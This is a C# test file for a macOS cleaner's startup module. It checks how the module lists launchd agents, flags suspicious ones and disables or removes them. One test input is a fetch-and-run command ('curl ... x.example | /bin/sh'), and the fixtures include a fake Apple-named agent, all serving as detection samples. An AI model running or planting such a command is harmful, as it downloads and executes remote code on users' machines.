using PcCleaner.Core;
using PcCleaner.Mac.Tests.Cleaner;
using PcCleaner.Mac.Tests.Support;
using PcCleaner.Modules.Startup;
using Xunit;

namespace PcCleaner.Mac.Tests.Startup;

/// <summary>Startup folders in a temporary folder with real plists from the CI machines and hand-made odd ones.</summary>
internal sealed class StartupHome : IDisposable
{
    public const string Gui = "gui/501";

    private readonly TempDir _dir = new();

    public StartupHome()
    {
        Folders = new StartupFolders(P("User/LaunchAgents"), P("Library/LaunchAgents"), P("Library/LaunchDaemons"), P("System/LaunchAgents"), P("System/LaunchDaemons"));
        Backups = new BackupStore(P("Backups"));
        User("hca.plist", Fixture.Text("launchd/hca.plist"));
        User("com.example.broken.plist", Agent("com.example.broken", "/Users/anna/missing/tool"));
        User("nolabel.plist", """<?xml version="1.0"?><plist version="1.0"><dict><key>ProgramArguments</key><array><string>/Users/anna/bin/x</string></array></dict></plist>""");
        User("garbage.plist", "это не plist");
        User("com.apple.updater.fake.plist", Agent("com.apple.updater.fake", "/Users/anna/Library/Application Support/fake/agent"));
        User("com.example.script.plist", Agent("com.example.script", "/bin/sh", "-c", "/Users/Shared/.x/run.sh --quiet"));
        File.Copy(Fixture.PathOf("launchd/com.veertu.anka.addons.ankarun.plist"), Path.Combine(Folders.GlobalAgents, "com.veertu.anka.addons.ankarun.plist"));
        File.Copy(Fixture.PathOf("launchd/com.veertu.anka.addons.ankaupd.plist"), Path.Combine(Folders.Daemons, "com.veertu.anka.addons.ankaupd.plist"));
        File.WriteAllText(Path.Combine(Folders.AppleAgents, "com.apple.SafariHistoryServiceAgent.plist"),
            Agent("com.apple.SafariHistoryServiceAgent", "/System/Library/PrivateFrameworks/SafariCore.framework/SafariHistoryServiceAgent"));
    }

    public StartupFolders Folders { get; }

    public BackupStore Backups { get; }

    public string UserPlist(string name) => Path.Combine(Folders.UserAgents, name);

    public static string Agent(string label, params string[] arguments)
        => $"""
            <?xml version="1.0" encoding="UTF-8"?>
            <plist version="1.0"><dict>
            <key>Label</key><string>{label}</string>
            <key>ProgramArguments</key><array>{string.Concat(arguments.Select(a => $"<string>{a}</string>"))}</array>
            <key>RunAtLoad</key><true/>
            </dict></plist>
            """;

    public void Dispose() => _dir.Dispose();

    private void User(string name, string content) => File.WriteAllText(UserPlist(name), content);

    private string P(string relative) => Directory.CreateDirectory(Path.Combine(_dir.Path, relative)).FullName;
}

public class StartupServiceTests
{
    private static readonly DateTime Stamp = new(2026, 10, 1, 0, 0, 0, DateTimeKind.Utc);

    private const string BundledPrint = """
        gui/501/com.example.bundled = {
        	active count = 1
        	path = /Applications/Example.app/Contents/Library/LaunchAgents/com.example.bundled.plist
        	type = LaunchAgent
        	state = running

        	program = /Applications/Example.app/Contents/MacOS/ExampleHelper
        	pid = 512
        	last exit code = (never exited)
        }
        """;

    internal static FakeCommandRunner Runner()
    {
        var fake = new FakeCommandRunner()
            .On("/bin/launchctl", new[] { "list" }, new CommandResult(0, Fixture.Text("launchd/list.txt") + "512\t0\tcom.example.bundled\n-\t78\tcom.example.broken\n", ""))
            .On("/bin/launchctl", new[] { "print-disabled", StartupHome.Gui },
                new CommandResult(0, "\tdisabled services = {\n\t\t\"com.example.broken\" => disabled\n\t}\n" + Fixture.Text("launchd/disabled-gui.txt"), ""))
            .OnFixture("/bin/launchctl", new[] { "print-disabled", "system" }, "launchd/disabled-system.txt")
            .OnFixture("/bin/launchctl", new[] { "print", "system/com.veertu.anka.addons.ankaupd" }, "launchd/print-system-ankaupd.txt")
            .On("/bin/launchctl", new[] { "print", StartupHome.Gui + "/com.example.bundled" }, new CommandResult(0, BundledPrint, ""));
        Codesign(fake, "/opt/hca/start_hca.sh", 1, "codesign/unsigned.txt");
        Codesign(fake, "/Users/anna/Library/Application Support/fake/agent", 0, "codesign/adhoc-app.txt");
        Codesign(fake, "/Users/Shared/.x/run.sh", 1, "codesign/unsigned.txt");
        Codesign(fake, "/Applications/Example.app", 0, "codesign/developer-id-dotnet.txt");
        return fake;
    }

    private static void Codesign(FakeCommandRunner fake, string path, int exit, string fixture)
        => fake.On("/usr/bin/codesign", new[] { "-dv", "--verbose=2", path }, new CommandResult(exit, "", Fixture.Text(fixture)));

    private static StartupService Service(StartupHome home, FakeCommandRunner fake, CleanerViewModelTests.FakeTrash? trash = null, BackupStore? backups = null)
        => new(home.Folders, 501, fake, new CodeSignatureService(fake, _ => Stamp), backups ?? home.Backups, new AdminPrompt(fake),
            trash ?? new CleanerViewModelTests.FakeTrash(), path => path.Contains("/missing/", StringComparison.Ordinal));

    private static async Task<Dictionary<string, LaunchEntry>> ListAsync(StartupService service, bool includeApple = false)
        => (await service.ListAsync(includeApple, CancellationToken.None)).Items.ToDictionary(e => e.Label);

    [Fact]
    public async Task List_SourcesStatesAndSignatures()
    {
        using var home = new StartupHome();
        var list = await Service(home, Runner()).ListAsync(includeApple: false, CancellationToken.None);
        Assert.Empty(list.Problems);
        Assert.Equal(
            new[] { "com.apple.updater.fake", "com.example.broken", "com.example.script", "garbage", "nolabel", "testuser-provisioner",
                "com.veertu.anka.addons.ankarun", "com.veertu.anka.addons.ankaupd", "com.example.bundled" },
            list.Items.Select(e => e.Label));
        var items = list.Items.ToDictionary(e => e.Label);

        var hca = items["testuser-provisioner"];
        Assert.Equal((LaunchSource.UserAgent, true, false, "/opt/hca/start_hca.sh"), (hca.Source, hca.RunAtLoad, hca.KeepAlive, hca.Target));
        Assert.Equal(new LaunchState(true, true, 945, 0), hca.State);
        Assert.Equal(SignatureKind.Unsigned, hca.Signature!.Kind);
        Assert.Equal(new[] { new PcCleaner.Modules.Processes.Hint("без подписи разработчика", false) }, hca.Hints);
        Assert.False(hca.IsBroken || hca.Disabled);

        var run = items["com.veertu.anka.addons.ankarun"];
        Assert.Equal((LaunchSource.GlobalAgent, true, true), (run.Source, run.KeepAlive, run.IsRunning));

        var upd = items["com.veertu.anka.addons.ankaupd"];
        Assert.Equal((LaunchSource.Daemon, true, false), (upd.Source, upd.NeedsAdmin, upd.Disabled));
        Assert.Equal(new LaunchState(true, false, null, 0), upd.State);

        var bundled = items["com.example.bundled"];
        Assert.Equal((LaunchSource.AppBundled, SignatureKind.DeveloperId, 512), (bundled.Source, bundled.Signature!.Kind, bundled.State!.Pid));
        Assert.Empty(bundled.Hints);
    }

    [Fact]
    public async Task List_BrokenDisabledAndSuspicious()
    {
        using var home = new StartupHome();
        var items = await ListAsync(Service(home, Runner()));

        var broken = items["com.example.broken"];
        Assert.Equal("программа не найдена: /Users/anna/missing/tool", broken.Problem);
        Assert.Equal((true, new LaunchState(true, false, null, 78)), (broken.Disabled, broken.State));
        Assert.Equal((false, "в plist нет метки (Label)"), (items["nolabel"].HasLabel, items["nolabel"].Problem));
        Assert.StartsWith("plist не читается", items["garbage"].Problem, StringComparison.Ordinal);

        var fake = items["com.apple.updater.fake"];
        Assert.Contains(fake.Hints, h => h is { Strong: true, Text: "называется как служба Apple, но программа не от Apple" });

        var script = items["com.example.script"];
        Assert.Equal(("/bin/sh", "/Users/Shared/.x/run.sh"), (script.Program, script.Target));
        Assert.True(script.HasStrongHint);
        Assert.Contains(script.Hints, h => h.Text.StartsWith("запускает команду оболочки", StringComparison.Ordinal));
        Assert.Equal(LaunchState.NotLoaded, script.State);
    }

    [Fact]
    public async Task List_AppleOnlyWhenAsked_AndNeverChecked()
    {
        using var home = new StartupHome();
        var fake = Runner();
        Assert.DoesNotContain("com.apple.SafariHistoryServiceAgent", (await ListAsync(Service(home, fake))).Keys);
        var apple = (await ListAsync(Service(home, fake), includeApple: true))["com.apple.SafariHistoryServiceAgent"];
        Assert.Equal((LaunchSource.Apple, true, (SignatureInfo?)null), (apple.Source, apple.ReadOnly, apple.Signature));
        Assert.Empty(apple.Hints);
        Assert.DoesNotContain(fake.Calls, c => c.StartsWith("/usr/bin/codesign", StringComparison.Ordinal) && c.Contains("/System/", StringComparison.Ordinal));
    }

    [Fact]
    public async Task Disable_UserAgent_CopiesThenDisablesAndStops()
    {
        using var home = new StartupHome();
        var fake = Runner()
            .On("/bin/launchctl", new[] { "disable", StartupHome.Gui + "/testuser-provisioner" }, new CommandResult(0, "", ""))
            .On("/bin/launchctl", new[] { "bootout", StartupHome.Gui + "/testuser-provisioner" }, new CommandResult(0, "", ""));
        var service = Service(home, fake);
        var result = await service.DisableAsync((await ListAsync(service))["testuser-provisioner"], CancellationToken.None);
        Assert.True(result.Ok, result.Message);
        var calls = fake.Calls.ToList();
        Assert.True(calls.IndexOf("/bin/launchctl disable gui/501/testuser-provisioner") < calls.IndexOf("/bin/launchctl bootout gui/501/testuser-provisioner"));
        var backup = Assert.Single(home.Backups.List());
        Assert.Equal(("отключение", home.UserPlist("hca.plist")), (backup.Details["action"], backup.OriginalPath));
        Assert.Equal(File.ReadAllBytes(home.UserPlist("hca.plist")), File.ReadAllBytes(backup.StoredFile!));
    }

    [Fact]
    public async Task Disable_Daemon_GoesThroughThePasswordWindow()
    {
        using var home = new StartupHome();
        var commands = new[]
        {
            new AdminCommand("/bin/launchctl", "disable", "system/com.veertu.anka.addons.ankaupd"),
            new AdminCommand("/bin/launchctl", "bootout", "system/com.veertu.anka.addons.ankaupd"),
        };
        var fake = Runner().On("/usr/bin/osascript", AdminPrompt.Arguments("Отключить «com.veertu.anka.addons.ankaupd» в автозагрузке", commands), new CommandResult(0, "", ""));
        var service = Service(home, fake);
        var result = await service.DisableAsync((await ListAsync(service))["com.veertu.anka.addons.ankaupd"], CancellationToken.None);
        Assert.True(result.Ok, result.Message);
        Assert.DoesNotContain(fake.Calls, c => c.StartsWith("/bin/launchctl disable", StringComparison.Ordinal));
        Assert.Single(home.Backups.List());
    }

    [Fact]
    public async Task Disable_Daemon_Cancelled()
    {
        using var home = new StartupHome();
        var fake = Runner();
        var service = Service(home, fake);
        var entry = (await ListAsync(service))["com.veertu.anka.addons.ankaupd"];
        var commands = new[] { new AdminCommand("/bin/launchctl", "disable", service.ServiceTarget(entry)), new AdminCommand("/bin/launchctl", "bootout", service.ServiceTarget(entry)) };
        fake.On("/usr/bin/osascript", AdminPrompt.Arguments("Отключить «com.veertu.anka.addons.ankaupd» в автозагрузке", commands),
            new CommandResult(1, "", "execution error: User canceled. (-128)"));
        Assert.Equal(new StartupResult(false, "Отменено — ничего не изменено."), await service.DisableAsync(entry, CancellationToken.None));
    }

    [Fact]
    public async Task NoBackup_NoChange()
    {
        using var home = new StartupHome();
        using var dir = new TempDir();
        var fake = Runner();
        var service = Service(home, fake, backups: new BackupStore(dir.File("not-a-folder", "x")));
        var entry = (await ListAsync(service))["testuser-provisioner"];
        foreach (var result in new[] { await service.DisableAsync(entry, CancellationToken.None), await service.RemoveAsync(entry, CancellationToken.None) })
        {
            Assert.False(result.Ok);
            Assert.StartsWith("Не удалось сохранить резервную копию — ничего не изменено", result.Message, StringComparison.Ordinal);
        }
        Assert.DoesNotContain(fake.Calls, c => c.Contains(" disable ", StringComparison.Ordinal) || c.Contains(" bootout ", StringComparison.Ordinal));
        Assert.True(File.Exists(home.UserPlist("hca.plist")));
    }

    [Fact]
    public async Task Enable_NotLoaded_LoadsIt()
    {
        using var home = new StartupHome();
        var plist = home.UserPlist("com.example.script.plist");
        var fake = Runner()
            .On("/bin/launchctl", new[] { "enable", StartupHome.Gui + "/com.example.script" }, new CommandResult(0, "", ""))
            .On("/bin/launchctl", new[] { "bootstrap", StartupHome.Gui, plist }, new CommandResult(0, "", ""));
        var service = Service(home, fake);
        Assert.Equal(new StartupResult(true, "«com.example.script» включена."),
            await service.EnableAsync((await ListAsync(service))["com.example.script"], CancellationToken.None));
        Assert.Contains($"/bin/launchctl bootstrap gui/501 {plist}", fake.Calls);
    }

    [Fact]
    public async Task Enable_Loaded_OnlyClearsTheOverride()
    {
        using var home = new StartupHome();
        var fake = Runner().On("/bin/launchctl", new[] { "enable", StartupHome.Gui + "/com.example.broken" }, new CommandResult(0, "", ""));
        var service = Service(home, fake);
        Assert.True((await service.EnableAsync((await ListAsync(service))["com.example.broken"], CancellationToken.None)).Ok);
        Assert.DoesNotContain(fake.Calls, c => c.Contains("bootstrap", StringComparison.Ordinal));
    }

    [Fact]
    public async Task Remove_OwnAgent_StopsCopiesAndTrashes()
    {
        using var home = new StartupHome();
        var trash = new CleanerViewModelTests.FakeTrash();
        var fake = Runner().On("/bin/launchctl", new[] { "bootout", StartupHome.Gui + "/testuser-provisioner" }, new CommandResult(0, "", ""));
        var service = Service(home, fake, trash);
        var result = await service.RemoveAsync((await ListAsync(service))["testuser-provisioner"], CancellationToken.None);
        Assert.True(result.Ok, result.Message);
        Assert.Equal(new[] { home.UserPlist("hca.plist") }, trash.Moved);
        Assert.Single(home.Backups.List());
    }

    [Fact]
    public async Task Remove_WithoutLabel_JustTrashes()
    {
        using var home = new StartupHome();
        var trash = new CleanerViewModelTests.FakeTrash();
        var fake = Runner();
        var service = Service(home, fake, trash);
        var entry = (await ListAsync(service))["nolabel"];
        Assert.False((await service.DisableAsync(entry, CancellationToken.None)).Ok);
        Assert.True((await service.RemoveAsync(entry, CancellationToken.None)).Ok);
        Assert.Equal(new[] { home.UserPlist("nolabel.plist") }, trash.Moved);
        Assert.DoesNotContain(fake.Calls, c => c.Contains("bootout", StringComparison.Ordinal));
    }

    [Fact]
    public async Task Refusals_ChangeNothing()
    {
        using var home = new StartupHome();
        var trash = new CleanerViewModelTests.FakeTrash();
        var fake = Runner();
        var service = Service(home, fake, trash);
        var items = await ListAsync(service, includeApple: true);
        Assert.False((await service.RemoveAsync(items["com.veertu.anka.addons.ankarun"], CancellationToken.None)).Ok);
        Assert.False((await service.RemoveAsync(items["com.veertu.anka.addons.ankaupd"], CancellationToken.None)).Ok);
        Assert.Equal(new StartupResult(false, "Записи macOS здесь только для просмотра."),
            await service.DisableAsync(items["com.apple.SafariHistoryServiceAgent"], CancellationToken.None));
        Assert.Empty(trash.Moved);
        Assert.Empty(home.Backups.List());
        Assert.DoesNotContain(fake.Calls, c => c.StartsWith("/usr/bin/osascript", StringComparison.Ordinal));
    }

    [MacFact]
    public async Task RealMac_ReadsEverything_WithoutChangingAnything()
    {
        var runner = new ProcessCommandRunner();
        using var dir = new TempDir();
        var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        var service = new StartupService(StartupFolders.For(home), MacNative.UserId, runner, new CodeSignatureService(runner), new BackupStore(dir.Path),
            new AdminPrompt(runner), new CleanerViewModelTests.FakeTrash());
        var list = await service.ListAsync(includeApple: true, CancellationToken.None);
        Assert.Empty(list.Problems);
        Assert.True(list.Items.Count(e => e.Source == LaunchSource.Apple) > 50);
        Assert.All(list.Items.Where(e => e.Source == LaunchSource.Apple), e => Assert.Empty(e.Hints));
        Assert.All(list.Items.Where(e => e.Source == LaunchSource.Daemon && e.HasLabel), e => Assert.NotNull(e.State));
        Assert.Empty(Directory.EnumerateFileSystemEntries(dir.Path));
    }

    [Theory]
    [InlineData("/opt/hca/start_hca.sh", "/opt/hca/start_hca.sh", null)]
    [InlineData("/bin/sh¦-c¦/Users/Shared/.x/run.sh --quiet", "/Users/Shared/.x/run.sh", "/Users/Shared/.x/run.sh --quiet")]
    [InlineData("/bin/bash¦-c¦cd /tmp && curl -s http://x.example/a | /bin/sh", "/bin/bash", "cd /tmp && curl -s http://x.example/a | /bin/sh")]
    [InlineData("/usr/bin/python3¦/Users/anna/.hidden/x.py", "/Users/anna/.hidden/x.py", null)]
    [InlineData("/usr/bin/osascript¦-e¦do shell script \"/private/tmp/x\"", "/private/tmp/x", "do shell script \"/private/tmp/x\"")]
    [InlineData("/usr/bin/open¦-a¦Telegram", "/usr/bin/open", null)]
    public void Target(string argumentList, string target, string? shellCommand)
    {
        var args = argumentList.Split('¦');
        Assert.Equal((target, shellCommand), StartupService.TargetOf(args[0], args));
    }
}
